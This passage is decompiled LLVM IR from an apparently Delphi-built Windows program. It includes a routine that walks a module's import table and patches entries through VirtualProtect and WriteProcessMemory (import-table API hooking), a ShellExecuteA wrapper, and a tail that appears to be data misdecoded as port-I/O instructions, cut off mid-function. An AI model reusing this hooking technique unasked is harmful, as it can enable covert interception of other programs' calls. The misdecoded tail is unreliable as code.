dec_label_pc_404a44:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !370
  %2 = add i32 %1, -1, !insn.addr !370
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !370
  ret i32 %0, !insn.addr !371
}

define i32 @function_404aa4(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404aa4:
  %esp.1.reg2mem = alloca i32, !insn.addr !372
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !372
  %eax.0.reg2mem = alloca i32, !insn.addr !372
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !373
  %7 = icmp eq i8 %6, 0, !insn.addr !373
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !374
  br i1 %7, label %dec_label_pc_404ab7, label %dec_label_pc_404aaf, !insn.addr !374

dec_label_pc_404aaf:                              ; preds = %dec_label_pc_404aa4
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !375
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !375
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !375
  br label %dec_label_pc_404ab7, !insn.addr !375

dec_label_pc_404ab7:                              ; preds = %dec_label_pc_404aaf, %dec_label_pc_404aa4
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !376
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !377
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !377
  %13 = ptrtoint i32* %12 to i32, !insn.addr !377
  %14 = add i32 %eax.0.reload, 8, !insn.addr !378
  %15 = inttoptr i32 %14 to i32*, !insn.addr !378
  store i32 %13, i32* %15, align 4, !insn.addr !378
  %16 = icmp eq i32* %12, null, !insn.addr !379
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !380
  br i1 %16, label %dec_label_pc_404b0f, label %dec_label_pc_404ad3, !insn.addr !380

dec_label_pc_404ad3:                              ; preds = %dec_label_pc_404ab7
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !381
  %18 = add i32 %eax.0.reload, 12, !insn.addr !382
  %19 = inttoptr i32 %18 to i32*, !insn.addr !382
  store i32 %17, i32* %19, align 4, !insn.addr !382
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !383
  %21 = add i32 %eax.0.reload, 16, !insn.addr !384
  %22 = inttoptr i32 %21 to i32*, !insn.addr !384
  store i32 %20, i32* %22, align 4, !insn.addr !384
  %23 = add i32 %eax.0.reload, 20, !insn.addr !385
  %24 = inttoptr i32 %23 to i32*, !insn.addr !385
  store i32 %arg3, i32* %24, align 4, !insn.addr !385
  %25 = load i32, i32* %22, align 4, !insn.addr !386
  %26 = add i32 %esp.0, -8, !insn.addr !387
  %27 = inttoptr i32 %26 to i32*, !insn.addr !387
  store i32 %25, i32* %27, align 4, !insn.addr !387
  %28 = add i32 %esp.0, -12, !insn.addr !388
  %29 = inttoptr i32 %28 to i32*, !insn.addr !388
  store i32 %17, i32* %29, align 4, !insn.addr !388
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !389
  %31 = ptrtoint i32* %30 to i32, !insn.addr !389
  %32 = add i32 %esp.0, -16, !insn.addr !390
  %33 = inttoptr i32 %32 to i32*, !insn.addr !390
  store i32 %31, i32* %33, align 4, !insn.addr !390
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !391
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !391
  %36 = add i32 %eax.0.reload, 24, !insn.addr !392
  %37 = inttoptr i32 %36 to i32*, !insn.addr !392
  store i32 %35, i32* %37, align 4, !insn.addr !392
  %38 = icmp eq i32 ()* %34, null, !insn.addr !393
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !394
  br i1 %38, label %dec_label_pc_404b0f, label %dec_label_pc_404afb, !insn.addr !394

dec_label_pc_404afb:                              ; preds = %dec_label_pc_404ad3
  %39 = load i32, i32* %24, align 4, !insn.addr !395
  %40 = add i32 %esp.0, -20, !insn.addr !396
  %41 = inttoptr i32 %40 to i32*, !insn.addr !396
  store i32 %39, i32* %41, align 4, !insn.addr !396
  %42 = load i32, i32* %15, align 4, !insn.addr !397
  %43 = add i32 %esp.0, -24, !insn.addr !398
  %44 = inttoptr i32 %43 to i32*, !insn.addr !398
  store i32 %42, i32* %44, align 4, !insn.addr !398
  %45 = call i32 @function_404b78(i32 ptrtoint (i32* @0 to i32)), !insn.addr !399
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !399
  br label %dec_label_pc_404b0f, !insn.addr !399

dec_label_pc_404b0f:                              ; preds = %dec_label_pc_404afb, %dec_label_pc_404ad3, %dec_label_pc_404ab7
  br i1 %7, label %dec_label_pc_404b26, label %dec_label_pc_404b17, !insn.addr !400

dec_label_pc_404b17:                              ; preds = %dec_label_pc_404b0f
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !401
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !402
  %48 = load i32, i32* %47, align 4, !insn.addr !402
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !402
  br label %dec_label_pc_404b26, !insn.addr !403

dec_label_pc_404b26:                              ; preds = %dec_label_pc_404b17, %dec_label_pc_404b0f
  %49 = add i32 %eax.0.reload, 4, !insn.addr !404
  %50 = inttoptr i32 %49 to i32*, !insn.addr !404
  %51 = inttoptr i32 %9 to i32*, !insn.addr !376
  ret i32 %eax.0.reload, !insn.addr !405
}

define i32 @function_404b30() local_unnamed_addr {
dec_label_pc_404b30:
  %eax.1.reg2mem = alloca i32, !insn.addr !406
  %eax.0.reg2mem = alloca i32, !insn.addr !406
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !407
  %4 = add i32 %3, 8, !insn.addr !408
  %5 = inttoptr i32 %4 to i32*, !insn.addr !408
  %6 = load i32, i32* %5, align 4, !insn.addr !408
  %7 = icmp eq i32 %6, 0, !insn.addr !408
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !409
  br i1 %7, label %dec_label_pc_404b6a, label %dec_label_pc_404b41, !insn.addr !409

dec_label_pc_404b41:                              ; preds = %dec_label_pc_404b30
  %8 = add i32 %3, 24, !insn.addr !410
  %9 = inttoptr i32 %8 to i32*, !insn.addr !410
  %10 = load i32, i32* %9, align 4, !insn.addr !410
  %11 = icmp eq i32 %10, 0, !insn.addr !410
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !411
  br i1 %11, label %dec_label_pc_404b6a, label %dec_label_pc_404b47, !insn.addr !411

dec_label_pc_404b47:                              ; preds = %dec_label_pc_404b41
  %12 = add i32 %3, 4, !insn.addr !412
  %13 = inttoptr i32 %12 to i32*, !insn.addr !412
  %14 = load i32, i32* %13, align 4, !insn.addr !412
  %15 = inttoptr i32 %14 to i8*, !insn.addr !413
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !414
  %17 = ptrtoint i32* %16 to i32, !insn.addr !414
  %18 = load i32, i32* %5, align 4, !insn.addr !415
  %19 = icmp eq i32 %18, %17, !insn.addr !415
  %20 = icmp eq i1 %19, false, !insn.addr !416
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !416
  br i1 %20, label %dec_label_pc_404b6a, label %dec_label_pc_404b55, !insn.addr !416

dec_label_pc_404b55:                              ; preds = %dec_label_pc_404b47
  %21 = load i32, i32* %9, align 4, !insn.addr !417
  %22 = call i32 @function_404b78(i32 %21), !insn.addr !418
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !418
  br label %dec_label_pc_404b6a, !insn.addr !418

dec_label_pc_404b6a:                              ; preds = %dec_label_pc_404b55, %dec_label_pc_404b47, %dec_label_pc_404b41, %dec_label_pc_404b30
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !419
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !420
  br i1 %24, label %dec_label_pc_404b75, label %dec_label_pc_404b6e, !insn.addr !420

dec_label_pc_404b6e:                              ; preds = %dec_label_pc_404b6a
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !421
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !421
  br label %dec_label_pc_404b75, !insn.addr !421

dec_label_pc_404b75:                              ; preds = %dec_label_pc_404b6e, %dec_label_pc_404b6a
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !422
}

define i32 @function_404b78(i32 %arg1) local_unnamed_addr {
dec_label_pc_404b78:
  %eax.0.reg2mem = alloca i32, !insn.addr !423
  %esp.0.reg2mem = alloca i32, !insn.addr !423
  %storemerge6.reg2mem = alloca i32, !insn.addr !423
  %.reg2mem14 = alloca i32, !insn.addr !423
  %esp.17.reg2mem = alloca i32, !insn.addr !423
  %esi.08.reg2mem = alloca i32, !insn.addr !423
  %.reg2mem = alloca i32, !insn.addr !423
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !424
  %4 = icmp eq i1 %3, false, !insn.addr !425
  %5 = icmp eq i32 %arg1, 0, !insn.addr !426
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_404c25, label %dec_label_pc_404b9e, !insn.addr !425

dec_label_pc_404b9e:                              ; preds = %dec_label_pc_404b78
  %6 = trunc i32 %2 to i16, !insn.addr !427
  %7 = trunc i32 %1 to i8, !insn.addr !428
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !429
  %8 = inttoptr i32 %0 to i32*, !insn.addr !430
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !430
  %10 = ptrtoint i32* %9 to i32, !insn.addr !430
  %11 = icmp eq i32* %9, null, !insn.addr !431
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !432
  br i1 %11, label %dec_label_pc_404c25, label %dec_label_pc_404c1e.preheader, !insn.addr !432

dec_label_pc_404c1e.preheader:                    ; preds = %dec_label_pc_404b9e
  %12 = add i32 %10, 12, !insn.addr !433
  %13 = inttoptr i32 %12 to i32*, !insn.addr !433
  %14 = load i32, i32* %13, align 4, !insn.addr !433
  %15 = icmp eq i32 %14, 0, !insn.addr !434
  %16 = icmp eq i1 %15, false, !insn.addr !435
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !435
  br i1 %16, label %dec_label_pc_404bb7.lr.ph, label %dec_label_pc_404c25, !insn.addr !435

dec_label_pc_404bb7.lr.ph:                        ; preds = %dec_label_pc_404c1e.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !429
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !436
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_404bb7

dec_label_pc_404bb7:                              ; preds = %dec_label_pc_404bb7.lr.ph, %dec_label_pc_404c1b
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !437
  %24 = add i32 %esp.17.reload, -4, !insn.addr !438
  %25 = inttoptr i32 %24 to i32*, !insn.addr !438
  store i32 %18, i32* %25, align 4, !insn.addr !438
  %26 = add i32 %esp.17.reload, -8, !insn.addr !439
  %27 = inttoptr i32 %26 to i32*, !insn.addr !439
  store i32 %23, i32* %27, align 4, !insn.addr !439
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !440
  %29 = icmp eq i32 %28, 0, !insn.addr !441
  %30 = icmp eq i1 %29, false, !insn.addr !442
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !442
  br i1 %30, label %dec_label_pc_404c1b, label %dec_label_pc_404bca, !insn.addr !442

dec_label_pc_404bca:                              ; preds = %dec_label_pc_404bb7
  %31 = add i32 %esi.08.reload, 16, !insn.addr !443
  %32 = inttoptr i32 %31 to i32*, !insn.addr !443
  %33 = load i32, i32* %32, align 4, !insn.addr !443
  %34 = add i32 %33, %arg1, !insn.addr !444
  %35 = inttoptr i32 %34 to i32*, !insn.addr !445
  %36 = load i32, i32* %35, align 4, !insn.addr !445
  %37 = icmp eq i32 %36, 0, !insn.addr !446
  %38 = icmp eq i1 %37, false, !insn.addr !447
  store i32 %36, i32* %.reg2mem14, !insn.addr !447
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !447
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !447
  br i1 %38, label %dec_label_pc_404bd2, label %dec_label_pc_404c1b, !insn.addr !447

dec_label_pc_404bd2:                              ; preds = %dec_label_pc_404bca, %dec_label_pc_404c12
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !448
  %40 = icmp eq i1 %39, false, !insn.addr !449
  br i1 %40, label %dec_label_pc_404c12, label %dec_label_pc_404bd7, !insn.addr !449

dec_label_pc_404bd7:                              ; preds = %dec_label_pc_404bd2
  %41 = add i32 %esp.17.reload, -12, !insn.addr !450
  %42 = inttoptr i32 %41 to i32*, !insn.addr !450
  store i32 %20, i32* %42, align 4, !insn.addr !450
  %43 = add i32 %esp.17.reload, -16, !insn.addr !451
  %44 = inttoptr i32 %43 to i32*, !insn.addr !451
  store i32 128, i32* %44, align 4, !insn.addr !451
  %45 = add i32 %esp.17.reload, -20, !insn.addr !452
  %46 = inttoptr i32 %45 to i32*, !insn.addr !452
  store i32 4, i32* %46, align 4, !insn.addr !452
  %47 = add i32 %esp.17.reload, -24, !insn.addr !453
  %48 = inttoptr i32 %47 to i32*, !insn.addr !453
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !453
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !454
  %50 = add i32 %esp.17.reload, -28, !insn.addr !455
  %51 = inttoptr i32 %50 to i32*, !insn.addr !455
  store i32 %21, i32* %51, align 4, !insn.addr !455
  %52 = add i32 %esp.17.reload, -32, !insn.addr !456
  %53 = inttoptr i32 %52 to i32*, !insn.addr !456
  store i32 4, i32* %53, align 4, !insn.addr !456
  %54 = add i32 %esp.17.reload, -36, !insn.addr !457
  %55 = inttoptr i32 %54 to i32*, !insn.addr !457
  store i32 %22, i32* %55, align 4, !insn.addr !457
  %56 = add i32 %esp.17.reload, -40, !insn.addr !458
  %57 = inttoptr i32 %56 to i32*, !insn.addr !458
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !458
  %58 = call i32* @GetCurrentProcess(), !insn.addr !459
  %59 = ptrtoint i32* %58 to i32, !insn.addr !459
  %60 = add i32 %esp.17.reload, -44, !insn.addr !460
  %61 = inttoptr i32 %60 to i32*, !insn.addr !460
  store i32 %59, i32* %61, align 4, !insn.addr !460
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !461
  %63 = add i32 %esp.17.reload, -48, !insn.addr !462
  %64 = inttoptr i32 %63 to i32*, !insn.addr !462
  store i32 %21, i32* %64, align 4, !insn.addr !462
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !463
  %66 = add i32 %esp.17.reload, -52, !insn.addr !464
  %67 = inttoptr i32 %66 to i32*, !insn.addr !464
  store i32 %65, i32* %67, align 4, !insn.addr !464
  %68 = add i32 %esp.17.reload, -56, !insn.addr !465
  %69 = inttoptr i32 %68 to i32*, !insn.addr !465
  store i32 4, i32* %69, align 4, !insn.addr !465
  %70 = add i32 %esp.17.reload, -60, !insn.addr !466
  %71 = inttoptr i32 %70 to i32*, !insn.addr !466
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !466
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !467
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !468
  br label %dec_label_pc_404c1b, !insn.addr !468

dec_label_pc_404c12:                              ; preds = %dec_label_pc_404bd2
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !469
  %74 = inttoptr i32 %73 to i32*, !insn.addr !445
  %75 = load i32, i32* %74, align 4, !insn.addr !445
  %76 = icmp eq i32 %75, 0, !insn.addr !446
  %77 = icmp eq i1 %76, false, !insn.addr !447
  store i32 %75, i32* %.reg2mem14, !insn.addr !447
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !447
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !447
  br i1 %77, label %dec_label_pc_404bd2, label %dec_label_pc_404c1b, !insn.addr !447

dec_label_pc_404c1b:                              ; preds = %dec_label_pc_404c12, %dec_label_pc_404bca, %dec_label_pc_404bd7, %dec_label_pc_404bb7
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !470
  %79 = add i32 %esi.08.reload, 32, !insn.addr !433
  %80 = inttoptr i32 %79 to i32*, !insn.addr !433
  %81 = load i32, i32* %80, align 4, !insn.addr !433
  %82 = icmp eq i32 %81, 0, !insn.addr !434
  %83 = icmp eq i1 %82, false, !insn.addr !435
  store i32 %81, i32* %.reg2mem, !insn.addr !435
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !435
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !435
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !435
  br i1 %83, label %dec_label_pc_404bb7, label %dec_label_pc_404c25, !insn.addr !435

dec_label_pc_404c25:                              ; preds = %dec_label_pc_404c1b, %dec_label_pc_404c1e.preheader, %dec_label_pc_404b9e, %dec_label_pc_404b78
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !471
}

define i32 @function_404c30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_404c30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !472
  %2 = inttoptr i32 %1 to i32*, !insn.addr !472
  %3 = load i32, i32* %2, align 4, !insn.addr !472
  ret i32 %3, !insn.addr !473
}

define i32 @function_404c34() local_unnamed_addr {
dec_label_pc_404c34:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !474
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !474
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !474
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !475
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !476
  %3 = add i32 %2, 1, !insn.addr !476
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !476
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !477
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !478
  ret i32 0, !insn.addr !479
}

define i32 @function_404c59() local_unnamed_addr {
dec_label_pc_404c59:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !480
  ret i32 %0, !insn.addr !480
}

define i32 @function_404c5e() local_unnamed_addr {
dec_label_pc_404c5e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !481
}

define i32 @function_404c60(i32 %arg1) local_unnamed_addr {
dec_label_pc_404c60:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !482
}

define i32 @function_404c64() local_unnamed_addr {
dec_label_pc_404c64:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !483
  %2 = add i32 %1, -1, !insn.addr !483
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !483
  ret i32 %0, !insn.addr !484
}

define i32* @function_404c6c(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404c6c:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !485
  ret i32* %0, !insn.addr !485
}

define i32 @function_404c74() local_unnamed_addr {
dec_label_pc_404c74:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !486
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !486
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !486
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !487
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !488
  %3 = add i32 %2, 1, !insn.addr !488
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !488
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !489
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !490
  ret i32 0, !insn.addr !491
}

define i32 @function_404c99() local_unnamed_addr {
dec_label_pc_404c99:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !492
  ret i32 %0, !insn.addr !492
}

define i32 @function_404c9e() local_unnamed_addr {
dec_label_pc_404c9e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !493
}

define i32 @function_404ca0(i32 %arg1) local_unnamed_addr {
dec_label_pc_404ca0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !494
}

define i32 @function_404ca4() local_unnamed_addr {
dec_label_pc_404ca4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !495
  %2 = add i32 %1, -1, !insn.addr !495
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !495
  ret i32 %0, !insn.addr !496
}

define i32 @function_404cac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_404cac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_404c30(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !497
  ret i32 %3, !insn.addr !498
}

define i32 @function_404cf8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404cf8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !499
  %2 = icmp eq i1 %1, false, !insn.addr !500
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_404c30(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !501
  ret i32 %3, !insn.addr !502
}

define i32 @function_404d28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_404d28:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !503
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !503
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !503
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !504
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !505
  %3 = call i32 @"@LStrPos"(), !insn.addr !506
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_404e00 to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !507
  %6 = call i32 @"@LStrPos"(), !insn.addr !508
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_404e00 to i32)
  %8 = call i32 @function_404c30(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !509
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !510
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !511
  ret i32 %9, !insn.addr !512
}

define i32 @function_404dc0() local_unnamed_addr {
dec_label_pc_404dc0:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !513
  ret i32 %0, !insn.addr !513
}

define i32 @function_404dc5() local_unnamed_addr {
dec_label_pc_404dc5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !514
}

define i32 @function_404dc7(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_404dc7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !515
}

define i32 @function_404dd7() local_unnamed_addr {
dec_label_pc_404dd7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !516
}

define i32 @function_404e24() local_unnamed_addr {
dec_label_pc_404e24:
  %0 = call i32 @function_404aa4(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404e94, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404ea0, i32 0, i32 0), i32 4213932), !insn.addr !517
  store i32 %0, i32* @global_var_4080f8, align 4, !insn.addr !518
  %1 = call i32 @function_404aa4(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404e94, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_404ebc, i32 0, i32 0), i32 4214008), !insn.addr !519
  store i32 %1, i32* @global_var_4080fc, align 4, !insn.addr !520
  %2 = call i32 @function_404aa4(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_404ed4, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_404ee0, i32 0, i32 0), i32 4214056), !insn.addr !521
  store i32 %2, i32* @global_var_408100, align 4, !insn.addr !522
  ret i32 %2, !insn.addr !523
}

define i32 @function_404e94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14, i32 %arg15, i32 %arg16) local_unnamed_addr {
dec_label_pc_404e94:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !524
  br i1 %10, label %dec_label_pc_404f09, label %dec_label_pc_404e96, !insn.addr !524

dec_label_pc_404e96:                              ; preds = %dec_label_pc_404e94
  br i1 %8, label %dec_label_pc_404ecc, label %dec_label_pc_404e99, !insn.addr !525

dec_label_pc_404e99:                              ; preds = %dec_label_pc_404e96
  %11 = trunc i32 %4 to i16, !insn.addr !526
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !526
  %13 = inttoptr i32 %0 to i8*, !insn.addr !526
  store i8 %12, i8* %13, align 1, !insn.addr !526
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !527
  store i8 %14, i8* %13, align 1, !insn.addr !527
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !528
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !528
  %19 = add i8 %16, %18, !insn.addr !528
  %20 = inttoptr i32 %17 to i8*, !insn.addr !528
  store i8 %19, i8* %20, align 1, !insn.addr !528
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !529
  %21 = trunc i32 %arg10 to i16, !insn.addr !530
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !530
  %23 = inttoptr i32 %9 to i32*, !insn.addr !530
